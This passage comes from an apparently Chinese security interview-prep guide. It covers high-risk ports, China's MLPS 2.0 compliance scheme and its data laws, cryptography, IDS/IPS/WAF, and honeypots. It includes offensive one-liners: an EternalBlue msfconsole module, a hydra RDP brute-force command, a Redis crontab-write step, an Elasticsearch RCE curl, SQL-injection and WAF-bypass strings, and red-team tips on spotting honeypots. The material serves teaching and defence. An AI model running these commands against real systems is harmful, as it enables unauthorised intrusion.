| 3389 | TCP | RDP | **BlueKeep (CVE-2019-0708)**、弱口令 |
| 4444 | TCP | Metasploit | 默认载荷端口 |
| 5000 | TCP | Docker Registry | 未授权镜像推送 |
| 5432 | TCP | PostgreSQL | 弱口令 |
| 5601 | TCP | Kibana | 未授权 |
| 5672 | TCP | RabbitMQ | 默认 guest/guest |
| 5900 | TCP | VNC | 弱口令 |
| 5984 | TCP | CouchDB | 未授权 |
| 6379 | TCP | Redis | **未授权 getshell** |
| 7001 | TCP | WebLogic | 反序列化、Console |
| 8000-8090 | TCP | Tomcat/JBoss/Django | 中间件漏洞 |
| 8080 | TCP | Tomcat/Jenkins | 中间件、未授权 |
| 8089 | TCP | Jenkins | 未授权脚本执行 |
| 8443 | TCP | HTTPS Alt | SSL |
| 8888 | TCP | Jupyter | 未授权代码执行 |
| 9000 | TCP | FastCGI/FortiGate | SSRF、命令执行 |
| 9043 | TCP | WebSphere | 反序列化 |
| 9090 | TCP | WebSphere/Prometheus | 后台 |
| 9092 | TCP | Kafka | 未授权 |
| 9200 | TCP | Elasticsearch | **未授权 + CVE-2015-1427 Groovy RCE** |
| 9300 | TCP | Elasticsearch | 节点通信 |
| 11211 | TCP | Memcached | **未授权 + UDP 反射 DDoS** |
| 15672 | TCP | RabbitMQ 管理 | 默认 guest |
| 27017 | TCP | MongoDB | **未授权** |
| 27018-27019 | TCP | MongoDB Shard | 未授权 |

**2. 端口扫描工具**：
- **Nmap**：`nmap -sS -p 1-65535 -T4 10.10.10.1`（SYN 半扫描，最快）
- **Masscan**：`masscan -p 1-65535 10.10.10.0/24 --rate=10000`（异步高速，全网扫描首选）
- **RustScan**：`rustscan -a 10.10.10.1`（masscan + nmap 集成）

**3. 识别服务版本（Banner + Probe）**：
```bash
# 详细 banner 抓取
nmap -sV -sC -p- 10.10.10.1
# -sV 服务版本探测
# -sC 默认脚本扫描（nmap scripting engine）

# 单独抓取
nc -nv 10.10.10.1 22  # SSH banner
curl -I http://10.10.10.1:8080  # HTTP headers
```

**4. 高危端口实战利用**（红队视角）：
| 端口 | 利用方式 | 工具/Payload |
|------|---------|-------------|
| 445 SMB | 永恒之蓝 | `msfconsole → use exploit/windows/smb/ms17_010_eternalblue` |
| 3389 RDP | 爆破 / BlueKeep | `hydra -L user.txt -P pass.txt rdp://10.10.10.1` |
| 6379 Redis | 主从复制 RCE / 写 crontab | `redis-cli -h 10.10.10.1 → CONFIG SET dir /var/spool/cron/` |
| 7001 WebLogic | T3 反序列化 | `weblogicScanner` / `ligh4tdc/WeblogicTool` |
| 8080 Tomcat | 弱口令 / AJP Ghostcat | `python ajpShooter.py 10.10.10.1 8009 / readme.txt` |
| 9200 ES | Groovy RCE | `curl -XPOST 'http://10.10.10.1:9200/_search' -d '{"script": "_source..."}'` |
| 27017 MongoDB | 未授权 | `mongo --host 10.10.10.1` |

**5. 蓝队视角：端口加固清单**：
- **关闭不必要端口**（最小化原则）。
- **防火墙白名单**：仅允许源 IP 访问管理端口（22/3389/3306）。
- **跳板机/JumpServer**：管理端口只能从堡垒机访问。
- **VPN/零信任**：远程办公走 Tailscale/WireGuard。
- **蜜罐/Port Honeypot**：Cowrie（SSH）、Dionaea（多协议）、Honeytrap。

**6. 端口复用与隐藏**：
- **端口复用**（Port Reuse）：通过防火墙规则将 80 端口同时用作 SSH（突破封锁）。
- **iHTTPS / reDuh**：HTTP 隧道（80 出网 + 内网穿透）。
- **DNS 隧道**：完全无端口，走 UDP 53 通道。

**解析**：

考察意图：网络与内网基础，记忆 + 应用。易错点：把端口对应服务记错（6379 是 Redis 不是 MySQL）、不知道哪些端口有默认弱口令。面试官想听到：常见高危端口（445/3389/6379/9200/27017）、能口述常见 Banner 识别方法、知道哪些端口对应哪些默认漏洞。

**考察知识点**：
- 常见端口对应服务（21/22/80/443/445/3389/3306/6379/9200/27017）
- 高危端口攻击：永恒之蓝、BlueKeep、Redis 未授权、ES RCE
- 端口扫描工具：Nmap / Masscan / RustScan
- Banner 识别 + 服务版本探测
- 端口复用与隧道

**验证脚本**（端口扫描与服务识别）：
```bash
# 1. Masscan 快速全端口扫描（10万/秒）
masscan -p 1-65535 10.10.10.0/24 --rate=10000 -oL masscan.txt

# 2. Nmap 深度扫描（重点端口 + 版本）
nmap -sS -sV -sC -A -p 21,22,23,80,135,139,443,445,1433,3306,3389,6379,8080,9200,27017 10.10.10.1 -oN nmap.txt

# 3. 单独 Redis 未授权检测（脚本化）
for ip in $(cat ip.txt); do
  echo -e "INFO\r\nQUIT\r" | timeout 3 nc $ip 6379 2>/dev/null | grep redis_version
done

# 4. ES 未授权检测
curl -s http://10.10.10.1:9200 | grep cluster_name

# 5. MongoDB 未授权
mongo --host 10.10.10.1 --eval "db.adminCommand('listDatabases')"

# 6. SMB 永恒之蓝检测
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.1

# 7. 批量 NSE 脚本扫描
nmap --script "vuln" -p 1-1000 10.10.10.1
```

### 第 54 天（精讲） ★★★★★ 等级保护 2.0 主要要求与流程


**主题**：安全运营与合规 / 等保 2.0

**答案**：

等级保护 2.0 是中国信息安全的基本国策，2019-12-01 实施：

**核心要求（"一个中心，三重防护"）**：
1. 安全通信网络
2. 安全区域边界
3. 安全计算环境
4. 安全管理中心

**五大保护对象扩展（区别于 1.0）**：
- 传统系统：基础信息网络、云计算
- 新增：移动互联网、物联网、工业控制系统、大数据

**等级划分**：
- 第一级（自主保护）：用户自主保护
- 第二级（指导保护）：审计保护
- 第三级（监督保护）：**最常见**，金融/政务/企业主流
- 第四级（强制保护）：重要行业（能源/交通/金融）
- 第五级（专控保护）：涉密系统

**定级要素**：
- 受侵害客体（公民/社会/国家）
- 侵害程度（一般/严重/特别严重）

**定级流程**：
1. 确定定级对象（独立系统/平台）
2. 自主定级（初步定级）
3. 专家评审（3 级及以上）
4. 主管部门审核
5. 公安机关备案审查

**备案流程**：
- 30 日内到地市级以上公安机关备案
- 提交：
  - 信息系统安全等级保护定级报告
  - 信息系统安全等级保护备案表
  - 安全等级保护建设方案

**测评流程**：
1. 建设整改（按等级要求建设）
2. 测评机构选择（具有资质）
3. 现场测评（差距分析）
4. 整改修复
5. 出具测评报告
6. 年度复测（三级每年一次）

**测评指标（按等级要求差异）**：
- 物理安全：机房选址、防火防盗、温湿度控制
- 网络安全：边界防护、访问控制、入侵防范
- 主机安全：身份鉴别、访问控制、安全审计
- 应用安全：身份鉴别、访问控制、通信完整性
- 数据安全：数据加密、备份恢复

**技术要求 vs 管理要求**：
- 技术：物理/网络/主机/应用/数据 5 个层面
- 管理：安全管理制度/机构/人员/建设/运维 5 个方面

**2.0 新增要求**：
1. 主动防御：态势感知、威胁情报、蜜罐
2. 动态感知：实时监测、关联分析
3. 集中管控：SOC/SIEM 集中管理
4. 密码应用要求：单独成册（2020 年实施）

**常见问题**：
- 云计算平台定级（云服务商/租户分别定级）
- 物联网扩展要求
- 移动互联扩展要求
- 工业控制扩展要求

**合规边界**：
- 不做等保：法律责任（《网络安全法》第 21 条）
- 罚款：1-10 万元
- 重大事故：直接责任人罚款 + 追究刑事责任

**合规等级与对应系统**：
- 二级：小型网站、内网 OA
- 三级：电商网站、政务门户、金融系统
- 四级：国家关键基础设施
- 五级：涉密

**解析**：

考察意图：合规是中国安全市场核心，几乎必问。回答要点：要讲清"一个中心三重防护"+定级流程。易错点：把 1.0 和 2.0 混淆。面试官想听到：能详细说明定级要素（受侵害客体+侵害程度）、三级系统的年度复测要求、2.0 新增的主动防御要求（蜜罐/态势感知）、密码应用单独要求（2020 年实施）。

**考察知识点**：

- 一个中心三重防护
- 三级系统每年测评
- 2.0 主动防御要求
- 云计算/移动互联扩展要求

---


---

### 第 55 天（精讲） 网络安全法、数据安全法与个人信息保护法核心要点
**主题**：合规 / 法律 / 等保

**答案**：

中国网安三大法律体系构成"三法一条例"框架：**《网络安全法》《数据安全法》《个人信息保护法》+《关键信息基础设施安全保护条例》**。

**1. 《网络安全法》（2017.6.1 施行）**：

**核心义务**：
| 条款 | 要求 | 责任主体 |
|------|------|----------|
| 第 21 条 | **等级保护**制度（网络安全等级保护）| 运营者 |
| 第 22 条 | 网络产品/服务安全漏洞及时告知 | 厂商 |
| 第 23 条 | 关键基础设施**网络安全审查** | 关基运营者 |
| 第 24 条 | 实名制（手机/宽带） | 电信运营商 |
| 第 27 条 | 禁止非法侵入、干扰、破坏 | 任何个人/组织 |
| 第 28 条 | 技术支持协助（执法） | 互联网公司 |
| 第 37 条 | **数据本地化**（关基在境内运营中收集和产生的个人信息和重要数据应当在境内存储）| 关基 |
| 第 41 条 | 个人信息保护（告知同意、最小必要） | 运营者 |
| 第 47 条 | 禁止设置恶意程序 | 厂商 |
| 第 51 条 | 应急预案 + 事件报告 | 运营者 |

**罚则**：
- 第 59 条：拒不改正的，关基运营者 **10-100 万元**罚款；直接责任人 **1-10 万元**罚款。
- 第 71 条：泄露个人信息，**100 万以下**罚款。
- 第 75 条：境外攻击国内关键设施的，依法从重处罚（**断网 6 个月**或**关闭网站**）。

**2. 《数据安全法》（2021.9.1 施行）**：

**核心制度**：
- **数据分类分级**：核心数据 / 重要数据 / 一般数据。
- **数据安全审查**：国家建立数据安全审查制度。
- **数据出境安全评估**：关基数据出境需**安全评估**（申报国家网信办）。
- **数据交易**：必须合法合规，数据交易所需备案。

**重要数据定义**：一旦遭到篡改、破坏、泄露或者非法获取、非法利用，可能危害国家安全、公共利益的**非个人数据**（如人口健康、地理信息、关键基础设施运行数据）。

**罚则**：
- 第 45 条：不履行数据安全保护义务，**5-50 万**罚款；关基运营者 **10-100 万**。
- 第 51 条：非法获取、出售数据，**违法所得 1-10 倍**罚款（无违法所得 100 万以下）。

**3. 《个人信息保护法》（PIPL，2021.11.1 施行）**：

**四要素合法性基础**：
1. 取得个人**同意**（默认规则）。
2. 订立/履行合同。
3. 法定职责 / 法定义务。
4. 应对突发公共卫生事件 / 紧急情况下保护人身/财产。

**敏感个人信息**：生物识别、宗教信仰、特定身份、医疗健康、金融账户、行踪轨迹、不满 14 周岁未成年人个人信息。处理需**单独同意**。

**"告知-同意"细化**：
- 个人信息处理者应当**真实、准确、完整**告知（处理目的、方式、种类、期限等）。
- 个人**单独同意**（不与其他同意捆绑）。
- 个人**撤回同意**：处理者应提供便捷撤回方式。

**跨境传输**：
- 关键信息基础设施运营者 + 处理个人信息达国家网信办规定数量的，**出境需安全评估**。
- 其他可走：**标准合同**或**认证**。

**罚则**：
- 第 66 条：违规处理个人信息，**100 万以下**罚款；情节严重的，**5000 万或上年营业额 5%** 罚款，**吊销许可**、**关闭网站**。
- 直接责任人 **10-100 万**罚款，**禁止从业 5 年**。

**4. 渗透测试的法律边界**：

| 行为 | 合法性 |
|------|--------|
| **书面授权**渗透测试 | ✅ 合法 |
| 公开漏洞奖励平台测试 | ✅ 合法 |
| **未授权**渗透测试 | ❌ 第 27 条非法侵入 |
| 利用漏洞**下载数据** | ❌ 触犯刑法 285（非法获取计算机信息系统数据罪）|
| 利用漏洞**敲诈勒索** | ❌ 触犯刑法 |
| DDoS 攻击 | ❌ 触犯刑法 285/286 |
| 制作传播木马 | ❌ 刑法 286 之一 |
| 涉外 APT 攻击国内设施 | ❌ 加重处罚 |

**5. 应急响应合规要求**：

**报告流程**（网络安全法第 25 条 + 事件应急预案）：
- **24 小时内**向保护工作部门、公安机关报告（重大/特别重大事件）。
- 保存相关原始记录（不少于 6 个月）。
- 配合调查取证。

**等保 2.0 应急响应要求**：
- 制定应急预案（每年至少 1 次演练）。
- 7×24 小时安全事件响应能力。
- 重要事件**1 小时内**上报。

**6. 实务合规清单**：

| 项目 | 要求 |
|------|------|
| 隐私政策 | 公开可见、用户同意 |
| 数据加密 | 敏感信息加密存储与传输 |
| 访问控制 | 最小权限 + 操作审计 |
| 第三方 SDK 审计 | 不得超范围收集 |
| Cookie 横幅 | 弹窗告知 + 同意 |
| 数据出境 | 安全评估 / 标准合同 / 认证 |
| 数据删除 | 用户请求删除 → 立即删除 |
| 漏洞披露 | 内部 24h 修复 + 用户告知 |

**7. 出海合规（GDPR 对照）**：
- PIPL 与 GDPR 高度相似，但 GDPR 处罚更重（**4% 全球营业额**）。
- 出海企业必须同时满足 GDPR + PIPL + CCPA（加州）+ 各州法律。
- DPO（数据保护官）岗位强制。

**解析**：

考察意图：合规与法律意识，是网安岗位的红线。易错点：把三法搞混（尤其处罚金额）；不知道渗透测试需要书面授权。面试官想听到：能讲清三法核心条款 + 处罚力度 + 渗透测试合规边界。

**考察知识点**：
- 三法施行日期与核心条款
- 等保 2.0 与三法的衔接
- 个人信息"告知-同意"原则
- 数据本地化与出境评估
- 渗透测试书面授权
- 应急响应报告时限（24h / 1h）
- 跨境合规（PIPL + GDPR）

**验证脚本**（合规自查清单）：
```python
#!/usr/bin/env python3
# 企业数据合规自查脚本（示例）
import json
from datetime import datetime

CHECKLIST = {
    "等保备案": {"required": True, "evidence": "等保备案证明"},
    "网络安全审查": {"required_if": "关基运营", "evidence": "审查报告"},
    "数据分类分级": {"required": True, "evidence": "数据资产清单"},
    "隐私政策": {"required": True, "evidence": "网页截图"},
    "用户同意机制": {"required": True, "evidence": "同意日志"},
    "敏感信息加密": {"required": True, "evidence": "加密策略文档"},
    "数据出境评估": {"required_if": "跨境传输", "evidence": "评估报告"},
    "第三方SDK审计": {"required": True, "evidence": "SDK列表+协议"},
    "应急响应预案": {"required": True, "evidence": "预案文档+演练记录"},
    "漏洞修复SLA": {"required": True, "evidence": "高危24h, 中危7d, 低危30d"},
    "操作审计日志": {"required": True, "evidence": "日志保留≥6个月"},
    "DPA数据处理协议": {"required_if": "委托处理", "evidence": "DPA合同"},
}

def audit(company_type="普通运营者"):
    report = {"date": str(datetime.now()), "company_type": company_type, "items": []}
    for item, info in CHECKLIST.items():
        if info.get("required") or (info.get("required_if") and info["required_if"] in company_type):
            report["items"].append({
                "item": item,
                "required": True,
                "evidence_needed": info["evidence"],
                "status": "待审核",
            })
    return report

if __name__ == "__main__":
    r = audit("关基运营者")
    print(json.dumps(r, ensure_ascii=False, indent=2))
```

### 第 56 天（精讲） ★★★★★ 对称加密与非对称加密区别及应用


**主题**：加解密与编码 / 加密算法

**答案**：

**对称加密（Symmetric Encryption）**：
- 原理：加解密使用同一密钥
- 优点：速度快（千倍于非对称），适合大量数据加密
- 缺点：密钥分发困难（n 方需要 n(n-1)/2 个密钥）、密钥管理复杂
- 算法：
  - DES（56 位 / 分组 64 位）：Feistel 结构，**已不安全**，可暴力破解
  - 3DES（168 位）：三次 DES，慢，逐渐淘汰
  - AES（128/192/256 位）：分组 128 位，SPN 结构，**当前主流**
  - 国密 SM4（128 位）：无线局域网标准
- 工作模式：
  - ECB（电子密码本）：相同明文→相同密文，**不安全**（图像加密后仍可识别）
  - CBC（密文分组链接）：需要 IV + PKCS7 填充，**最常用**
  - GCM（伽罗瓦计数器）：认证加密（AEAD），提供完整性校验

**非对称加密（Asymmetric Encryption）**：
- 原理：公钥（公开）+ 私钥（保密）一对，加密用公钥则解密用私钥，反之亦然
- 优点：解决密钥分发问题（n 方只需 n 对密钥）、支持数字签名
- 缺点：速度慢千倍，不适合大量数据
- 算法：
  - RSA：基于大整数分解难题，主流
  - ECC：椭圆曲线密码学，密钥短/性能好，TLS 1.3 首选
  - ElGamal：基于离散对数
  - 国密 SM2：椭圆曲线，256 位
- 应用：
  - 加密少量数据 / 密钥
  - 数字签名
  - 密钥协商

**混合加密方案（实际应用）**：
1. 用非对称加密传输对称密钥
2. 用对称加密传输数据
3. HTTPS 正是此模式：RSA/ECDHE 传 AES 密钥 + AES 加密数据

**应用场景**：
- 对称：文件加密、磁盘加密、数据库加密
- 非对称：数字签名、SSL/TLS 握手、PKI 证书
- 混合：HTTPS、PGP、加密邮件

**Hash 摘要算法**：
- MD5（128 位）：已不安全，碰撞攻击
- SHA-1（160 位）：已不安全（2017 年碰撞）
- SHA-256（256 位）：主流，抗碰撞强
- 国密 SM3（256 位）：国产摘要
- 用途：完整性校验、密码存储（加盐）、数字签名

**HMAC（Hash-based Message Authentication Code）**：
- Hash + 密钥的消息认证码
- 算法：HMAC-SHA256、HMAC-MD5
- 用途：API 签名（防止参数篡改）、身份验证
- 比单纯 Hash 多一层身份认证

**解析**：

考察意图：密码学基础几乎必问。回答要点：要讲清对称/非对称+算法对比+实际应用。易错点：混淆 AES 工作模式（ECB 不安全）或不知道 RSA 原理。面试官想听到：能详细解释 RSA 原理（大整数分解难题）、AES-GCM 认证加密优势（防篡改）、为什么 HTTPS 混合加密（RSA 慢但解决密钥分发）。

**考察知识点**：

- 对称 AES vs 非对称 RSA + ECC
- 混合加密 HTTPS 模式
- AES 工作模式 ECB / CBC / GCM
- HMAC 消息认证码

---


---

### 第 57 天（精讲） IDS / IPS / WAF / 防火墙区别与部署
**主题**：网络安全 / 防御体系 / 边界安全

**答案**：

四类边界/流量安全设备的**部署位置**和**工作层次**完全不同，需组合使用才能形成完整防御体系。

**1. 防火墙（Firewall）**：

**定义**：基于**网络层/传输层**包过滤的访问控制设备。

**工作层级**：L3-L4（IP、端口、协议）。

**核心能力**：
- ACL 访问控制列表（IP/端口/协议）。
- 状态检测（Stateful Inspection）：跟踪 TCP 状态。
- NAT / VPN / 路由。

**局限**：**不解析应用层内容**，无法识别 SQL 注入、XSS 等 Web 攻击。

**代表产品**：华为 USG、Cisco ASA、iptables、pfSense（开源）。

**2. IDS（Intrusion Detection System，入侵检测）**：

**定义**：**旁路监听**流量，**被动检测**并告警，**不阻断**流量。

**工作层级**：L2-L7（部分 L7 DPI）。

**两种类型**：
- **NIDS（Network IDS）**：网络层监听，如 Snort、Suricata、Zeek。
- **HIDS（Host IDS）**：主机层，如 OSSEC、Tripwire、Wazuh。

**检测方式**：
- **误用检测（Signature-based）**：特征匹配（Snort 规则），准确率高、漏报多。
- **异常检测（Anomaly-based）**：统计学习基线，误报多、漏报少。
- **状态检测**：关联多条事件，检测 APT 链。

**部署**：镜像交换机端口（SPAN/TAP），**不影响业务**。

**3. IPS（Intrusion Prevention System，入侵防御）**：

**定义**：IDS 升级版，**串联在链路上**，发现攻击**主动阻断**。

**工作层级**：L2-L7。

**核心能力**：检测 + 阻断（Drop / Reset / TCP Reset）。

**部署模式**：
- **Inline 串联**：直接串在交换机/路由器之间，**有故障风险**（Bypass 机制）。
- **HA 双机热备**：保证可用性。

**与 IDS 区别**：
| 维度 | IDS | IPS |
|------|-----|-----|
| 部署 | 旁路 | 串联 |
| 行为 | 检测告警 | 检测阻断 |
| 风险 | 低 | 误阻断可能 |
| 适用 | 监测审计 | 边界防御 |

**代表产品**：华为 NIP、Cisco Firepower、Snort Inline、Suricata IPS 模式。

**4. WAF（Web Application Firewall，Web 应用防火墙）**：

**定义**：**专门针对 HTTP/HTTPS 流量**的应用层防火墙。

**工作层级**：L7（HTTP）。

**核心能力**：
- **SQL 注入防御**：正则 + 语义分析 + 机器学习。
- **XSS 防御**：DOM + 反射 + 存储型。
- **CSRF 防御**：Referer / Token 校验。
- **文件上传防御**：扩展名 + MIME + 内容检测。
- **CC 攻击**：频率限制、JS 挑战。
- **爬虫防护**：行为分析 + JS 渲染。

**部署模式**：
- **反向代理模式**：Nginx 风格，**最常用**（ModSecurity、OpenResty + Lua）。
- **透明代理**：Bridged 在网桥上。
- **旁路模式**：仅审计，不阻断。

**开源 vs 商业**：
- **开源**：ModSecurity（OWASP CRS）、Coraza、OpenResty + Lua。
- **商业**：阿里云 WAF、腾讯云 WAF、长亭雷池、F5 ASM、Imperva。

**5. 四者对比**：

| 维度 | 防火墙 | IDS | IPS | WAF |
|------|--------|-----|-----|-----|
| 层级 | L3-L4 | L2-L7 | L2-L7 | L7 |
| 串联/旁路 | 串联 | 旁路 | 串联 | 串联/反向代理 |
| 阻断 | ✅ | ❌ | ✅ | ✅ |
| Web 攻击 | ❌ | ⚠️ | ⚠️ | ✅ |
| 性能开销 | 低 | 低 | 中 | 高 |
| 误报 | 极低 | 中 | 中 | 低（针对性规则）|

**6. 完整防御体系部署**（企业实战）：

```
Internet
   │
[ 防火墙 ]   ← L3-L4 边界（ACL、NAT、VPN）
   │
[ IPS ]      ← L2-L7 流量深度检测 + 阻断
   │
[ 负载均衡 / 反向代理 ] ← 可挂 WAF（ModSecurity）
   │
[ WAF ]      ← L7 HTTP 深度检测
   │
[ Web Server集群]
   │
[ 内网 IDS ] ← 内网异常流量监测（旁路）
   │
[ HIDS ]     ← 主机层日志审计
```

**7. 实战选型建议**：

| 场景 | 推荐组合 |
|------|----------|
| 中小企业（Web 为主） | 防火墙 + WAF（云 WAF 也可）|
| 中型企业 | 防火墙 + IPS + WAF + 内网 IDS |
| 大型/关基企业 | 防火墙 + IPS + WAF + SOC 平台 + 蜜罐 + EDR |
| 云上业务 | 安全组 + WAF + 云原生 IDS + CSPM |

**8. 绕过与对抗**：

| 设备 | 常见绕过手法 |
|------|-------------|
| 防火墙 | 协议隧道（DNS / ICMP / HTTP）、反弹 shell 走 443 |
| IDS | 分片、加密流量、慢速攻击、低频特征 |
| IPS | 双 URL 编码、参数污染、协议混淆 |
| WAF | 编码绕过（HTML/Unicode/双重）、分块传输、参数污染、HTTP 协议走私 |

**9. 蜜罐技术补充**：

蜜罐是主动防御：
- **低交互蜜罐**：模拟服务端口（Cowrie SSH、Dionaea SMB）。
- **高交互蜜罐**：真实系统，记录攻击者全行为。
- **客户端蜜罐**：恶意 URL 爬虫。
- **商业蜜罐**：长亭谛听、默安刃甲、360 蜜罐云。

**蜜罐识别**（红队视角）：
- 端口特征（默认 banner）。
- 文件系统干净度（无用户数据）。
- 网络行为（无真实流量）。
- 流量分析（TCP/IP 指纹）。

**解析**：

考察意图：企业安全防御体系认知 + 部署位置 + 误报管理。易错点：混淆 IDS 与 IPS（旁路 vs 串联）、以为防火墙能挡 SQLi。面试官想听到：四者工作层级差异、完整防御架构、绕过手法与对抗。

**考察知识点**：
- 防火墙 L3-L4 / IDS 旁路 / IPS 串联 / WAF L7
- 误用检测 vs 异常检测
- 完整防御体系分层架构
- WAF 绕过：编码、分块、参数污染
- 蜜罐分类与识别

**验证脚本**（IDS/IPS/WAF 探测）：
```bash
# 1. ModSecurity 部署（OpenResty + WAF）
apt install libmodsecurity3 libmodsecurity-dev
# 配置 OWASP CRS
git clone https://github.com/coreruleset/coreruleset
cp crs/setup.conf.example /etc/modsecurity/crs/crs-setup.conf

# 2. Suricata IPS 模式
suricata -c /etc/suricata/suricata.yaml --af-packet -D
# 测试告警：
curl "http://target.com/?id=1' OR '1'='1"
# 查看 alert.log 应有 ET WEB_SERVER SQL Injection 告警

# 3. Snort IDS 模式（旁路监听）
snort -A console -c /etc/snort/snort.conf -i eth0

# 4. 探测 WAF 类型
wafw00f https://target.com
# 输出：is behind a Cloudflare WAF

# 5. iptables 防火墙规则示例
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -P INPUT DROP

# 6. WAF 绕过测试（编码绕过）
curl "http://target.com/?id=1%27%20OR%20%271%27%3D%271"  # URL 编码
curl "http://target.com/?id=1%2527"  # 双重编码
curl -H "Transfer-Encoding: chunked"  # 分块
```

### 第 58 天（精讲） 蜜罐技术原理与实战
**主题**：网络安全 / 主动防御 / 蜜罐

**答案**：

蜜罐（Honeypot）是一种**主动防御**技术，**没有业务价值**，专门用来**诱骗攻击者、记录攻击行为**。

**1. 蜜罐分类**：

**按交互度**：
- **低交互蜜罐**：模拟服务端口特征（Cowrie SSH 模拟、Dionaea SMB），**风险低**，但只能骗初级。
- **高交互蜜罐**：真实操作系统 / 服务（真实 Windows + RDP），**风险高**（攻击者可作为跳板），但能记录完整攻击链。
- **中等交互**：介于两者之间。

**按部署位置**：
- **服务端蜜罐**：部署在企业内网，模拟各种服务。
- **客户端蜜罐**：爬虫主动访问可疑 URL（如 Thug、Cuckoo Sandbox）。
- **蜜签（Honeytoken）**：伪造的敏感文件 / 数据库记录 / API Key（一旦被访问就告警）。

**2. 蜜罐的核心价值**：

| 价值 | 说明 |
|------|------|
| **诱捕攻击者** | 拖延时间、转移攻击目标 |
| **行为取证** | 记录完整攻击手法（命令、工具、IP）|
| **威胁情报** | 获取攻击者 IOC（IP、域名、payload）|
| **未知威胁发现** | 0day 攻击的早期发现（攻击者测试漏洞）|
| **减少误报** | 真实业务不会有访问蜜罐 → 触发即告警 |
| **消耗攻击者资源** | 时间 + 算力 |

**3. 主流开源蜜罐**：

| 蜜罐 | 协议 | 难度 |
|------|------|------|
| **Cowrie** | SSH/Telnet | ⭐⭐（Python，部署简单）|
| **Dionaea** | SMB/HTTP/FTP/SIP/MSSQL | ⭐⭐⭐（Python，最经典）|
| **Honeytrap** | 多协议动态监听 | ⭐⭐⭐ |
| **Glastopf** | Web SQLi/XSS | ⭐⭐ |
| **Wordpot** | WordPress | ⭐ |
| **Elastichoney** | Elasticsearch | ⭐ |
| **Rdpy** | RDP | ⭐⭐⭐ |
| **T-Pot** | 多蜜罐一体化（Docker 集成） | ⭐⭐（推荐新手）|

**4. Cowrie SSH 蜜罐部署实战**：

```bash
# 1. 安装（Docker 方式最简单）
docker run -d --name cowrie -p 2222:2222 cowrie/cowrie

# 2. 修改默认端口（不要用 22，避免占用真实 SSH）
# cowrie.cfg 中 listen_port = 2222

# 3. 查看日志（攻击者操作）
tail -f /cowrie/var/log/cowrie/cowrie.json
# 记录字段：eventid, username, password, src_ip, command

# 4. 关键配置（cowrie.cfg）
[interact]
# 模拟文件系统层（loglevel=info 记录命令）
filesystem = etc/cowrie/fs.pickle

# 蜜签用户名（弱口令诱饵）
auth_class = AuthRandom
# 弱密码列表（让攻击者"破解成功"进入虚拟 shell）
password_file = etc/userdb.txt
```

**5. 蜜罐识别（红队视角）**：

攻击者识别蜜罐的常见手法：

| 维度 | 蜜罐特征 | 真实系统特征 |
|------|----------|------------|
| **SSH** | banner 含 "cowrie" 字样、协议字段异常 | OpenSSH 标准 banner |
| **HTTP** | 页面内容静态、JS 无交互 | 动态业务 |
| **文件系统** | `ls -la` 看常见目录都为空 | 有用户数据 |
| **进程** | `ps aux` 进程极少 | 多服务进程 |
| **网络** | `ping` 正常但 `traceroute` 显示无上游 | 有真实路由 |
| **CPU/IO** | 蜜罐占用极低 | 真实负载 |
| **时间** | 系统时间可能停滞 | 实时更新 |
| **TCP 指纹** | p0f 识别为非常规 OS | 标准 OS 指纹 |

**反蜜罐**（红队）：一旦发现，先断开连 + 清痕迹 + 更换 IP + 重新评估目标。

**6. 商业蜜罐平台**：

- **国内**：长亭谛听、默安刃甲、360 蜜罐云、安恒蜜罐。
- **国外**：Thinkst Canary（Cowrie 商业化）、TrapX（已并入 Ivanti）。

**Canary 特点**：
- 部署简单（一个 token，插网线即可）。
- 触发即邮件 / Slack 告警。
- 价格适中（家庭版 ~$5000/年）。

**7. 蜜签（Honeytoken）**：

**概念**：放置**伪造的敏感信息**，一旦被访问就告警。

**实战场景**：
- 在公司文档服务器放置 `passwords_2024.docx`（含假密码）。
- 在 GitHub 公开仓库放置假 AWS AccessKey（监控调用）。
- 在 AD 域放置假用户（如 `admin_backup`），监控是否被登录。
- 在数据库放置假客户表（如 `customers_sensitive`），监控查询日志。

**AWS Canarytoken**：https://canarytokens.org，免费生成蜜签：
- 文件 / URL / DNS / Word / Excel / PDF / Slack API / QR code。
- 一旦访问，邮件告警。

**8. 蜜罐溯源反制（与 D38 衔接）**：

**蜜罐获取攻击者信息**：
- **浏览器指纹**：JS 注入记录浏览器版本、插件、屏幕分辨率。
- **Payload 反制**：蜜罐投放带 RCE 的 Payload，攻击者执行后回连（**蜜罐 reverse shell**）。
- **蜜罐自删除陷阱**：触发后主动 push 杀软 / 钓鱼软件到攻击者。

**典型案例**：
- 2018 年起，国内多个红队被蜜罐反制，被获取真实 IP 和微信 ID。
- "御点"蜜罐 → JSONP 获取浏览器信息 → 关联社工库。

**9. 蜜罐与 SOC / SIEM 联动**：

```
[蜜罐 Cowrie] → syslog → [ELK]
[蜜罐 Dionaea] → filebeat → [Splunk / QRadar]
                  ↓
              [SOC 告警] → 邮件/钉钉/企业微信
                  ↓
            [联动防火墙] → 自动封禁攻击者 IP
```

**10. 等保 2.0 对蜜罐的认可**：

- 等保 2.0 三级要求中，"主动防御"作为加分项。
- 关基场景推荐部署蜜罐 + SOC + EDR 联动。

**解析**：

考察意图：主动防御 + 红蓝对抗知识。易错点：把蜜罐当 IDS（蜜罐是诱骗，IDS 是监听）；不知道蜜罐有反制能力。面试官想听到：蜜罐分类、开源工具（Cowrie/Dionaea）、蜜签（Honeytoken）、蜜罐反制溯源。

**考察知识点**：
- 低交互 vs 高交互 vs 蜜签
- 主流开源蜜罐（Cowrie SSH / Dionaea SMB / T-Pot）
- 蜜罐识别（红队视角）
- 蜜罐反制（payload 反打、浏览器指纹）
- 与 SOC/SIEM 联动
- 等保 2.0 与蜜罐关系

**验证脚本**（蜜罐部署与攻击测试）：
```bash
# 1. T-Pot 一体化部署（推荐新手，Docker 集成多蜜罐）
git clone https://github.com/telekom-security/tpotce
cd tpotce/iso/installer
./install.sh --type=user

# 启动后默认端口：
# 22 → Cowrie SSH
# 2222 → Cowrie SSH Alt
# 445 → Dionaea SMB
# 8080 → Conpot Web

# 2. 部署 Cowrie 单独
docker run -d -p 2222:2222 --name cowrie cowrie/cowrie
# 测试登录
ssh -p 2222 root@localhost
# 输入密码 → 蜜罐捕获命令

# 3. 查看 Cowrie 捕获日志
docker exec cowrie cat /cowrie/var/log/cowrie/cowrie.json | jq '.'

# 4. 蜜签部署（Canarytoken）
# 浏览器访问 https://canarytokens.org/generate
